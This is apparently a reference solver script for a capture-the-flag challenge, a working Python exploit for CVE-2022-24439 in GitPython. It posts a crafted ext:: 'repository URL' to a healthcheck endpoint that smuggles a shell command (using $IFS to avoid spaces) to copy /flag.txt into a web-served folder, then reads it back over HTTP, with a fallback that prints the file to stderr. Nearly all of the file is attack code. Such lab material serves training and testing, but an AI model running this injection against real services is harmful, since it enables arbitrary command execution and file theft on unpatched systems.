#!/usr/bin/env python3
"""Reference solver for cve-hookrelay (CVE-2022-24439, GitPython < 3.1.30).

The mirror healthcheck hands our "repository URL" straight to GitPython 3.1.29's
clone_from, which does not validate it. We use git's `ext::` transport to run a
command as the agent. The command copies this instance's flag into the agent's
world-served scratch dir (/app/pub), which we then read back over HTTP -- a
self-contained read channel that needs no callback server.

    python3 solve.py http://HOST:PORT

Exit 0 and prints NCTF{...} on success.
"""
import re
import sys
import urllib.parse
import urllib.request

FLAG_RE = re.compile(r"NCTF\{[^}]+\}")


def _post(base, repo):
    data = urllib.parse.urlencode({"repo": repo}).encode()
    req = urllib.request.Request(base.rstrip("/") + "/check", data=data)
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.read().decode("utf-8", "replace")


def _get(base, path):
    req = urllib.request.Request(base.rstrip("/") + path)
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.read().decode("utf-8", "replace")


def solve(base):
    # Unique drop name so concurrent solves / re-runs never collide.
    drop = "log_%s.txt" % re.sub(r"\W", "", repr(id(object())))[:12]

    # ext:: runs the command via execvp; the words are split on spaces by the
    # remote-ext helper, so we keep each argument space-free and let the inner
    # `sh -c` re-introduce spaces through $IFS.
    #   ext::sh -c cp${IFS}/flag.txt${IFS}/app/pub/<drop>
    payload = "ext::sh -c cp${IFS}/flag.txt${IFS}/app/pub/" + drop

    _post(base, payload)  # fires the command; the clone itself "fails" (expected)

    # Primary channel: read the dropped file back.
    try:
        body = _get(base, "/pub/" + drop)
        m = FLAG_RE.search(body)
        if m:
            return m.group(0)
    except Exception:
        pass

    # Fallback channel: some git builds surface the helper's stderr in the error
    # the healthcheck prints. Try exfil straight to stderr.
    html = _post(base, "ext::sh -c cat${IFS}/flag.txt${IFS}1>&2")
    m = FLAG_RE.search(html)
    if m:
        return m.group(0)

    raise SystemExit("no flag recovered -- check ext:: transport is enabled")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    flag = solve(sys.argv[1])
    print(flag)
